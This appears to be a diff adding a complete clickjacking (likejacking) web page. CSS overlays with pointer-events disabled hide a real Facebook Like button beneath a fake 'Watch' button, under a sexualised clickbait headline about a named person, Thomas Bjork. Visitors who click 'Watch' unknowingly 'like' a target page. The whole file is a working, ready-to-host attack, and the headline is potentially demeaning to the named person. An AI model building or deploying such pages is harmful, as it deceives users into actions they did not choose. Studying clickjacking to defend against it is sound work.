@@ -1,0 +1,59 @@
+<html>
+<head>
+  <title>Clickjacking!</title>
+</head>
+
+<style type="text/css">
+  .hide-like {
+    width: 46px;
+    height: 20px;
+    border: 1px solid black;
+    background: white;
+    position: absolute;
+    margin: 0px;
+    text-align: center;
+    font-family: arial;
+    z-index: 1000;
+    cursor: pointer;
+    pointer-events: none;
+  }
+  .hide-like:hover {
+    background: #eee;
+    cursor: pointer;
+  }
+  .hide-count {
+    width: 478px;
+    height: 272px;
+    background: white;
+    position: absolute;
+    z-index: 500;
+    pointer-events: none;
+    cursor: pointer;
+  }
+
+  .wrapper {
+    margin: 5px;
+    position: relative;
+  }
+</style>
+<body>
+
+  <h1>Shocking video of Thomas Bjork Taking His Pants Off</h1>
+  <img src="images/bjork.jpg">
+  <div class="wrapper">
+    <div class="hide-like">Watch</div>
+    <div class="hide-count"></div>
+    <div class="fb-like" data-href="http://twitter.com/pushmatrix" data-width="1" data-colorscheme="light" data-layout="button_count" data-action="like" data-show-faces="false" data-send="false"></div>
+  </div>
+
+  <div id="fb-root"></div>
+  <script>(function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));</script>
+
+</body>
+</html>
